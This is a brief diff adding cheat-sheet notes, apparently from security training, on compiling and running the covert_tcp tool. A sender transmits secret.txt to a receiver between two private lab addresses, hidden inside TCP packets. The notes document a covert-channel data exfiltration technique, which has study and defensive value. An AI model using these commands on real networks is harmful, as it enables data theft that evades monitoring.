@@ -1,0 +1,4 @@
+<< tcp_covert >> 
+cc -o covert_tcp covert_tcp.c
+<sender> ./covert_tcp -source 10.10.1.13 -dest 10.10.1.5 -source_port 3333 -dest_port 4444 -file secret.txt
+<receiver>./covert_tcp -source 10.10.1.13 -source_port 4444 -server -file receive.txt
